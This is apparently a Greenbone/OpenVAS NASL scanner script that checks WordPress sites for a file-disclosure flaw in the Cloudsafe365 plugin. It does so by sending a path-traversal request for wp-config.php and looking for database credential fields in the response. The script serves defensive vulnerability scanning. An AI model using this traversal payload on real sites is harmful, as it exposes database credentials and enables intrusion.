CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103555" );
	script_bugtraq_id( 55241 );
	script_version( "$Revision: 11159 $" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_name( "WordPress Cloudsafe365 Plugin 'file' Parameter Remote File Disclosure Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/55241" );
	script_tag( name: "last_modification", value: "$Date: 2018-08-29 12:26:39 +0200 (Wed, 29 Aug 2018) $" );
	script_tag( name: "creation_date", value: "2012-08-28 18:02:43 +0200 (Tue, 28 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wordpress/installed" );
	script_tag( name: "summary", value: "The Cloudsafe365 plugin for WordPress is prone to a file-
disclosure vulnerability because it fails to properly sanitize user-
supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to view local files in the
context of the web server process. This may aid in further attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php";
if(http_vuln_check( port: port, url: url, pattern: "DB_NAME", extra_check: make_list( "DB_USER",
	 "DB_PASSWORD" ) )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

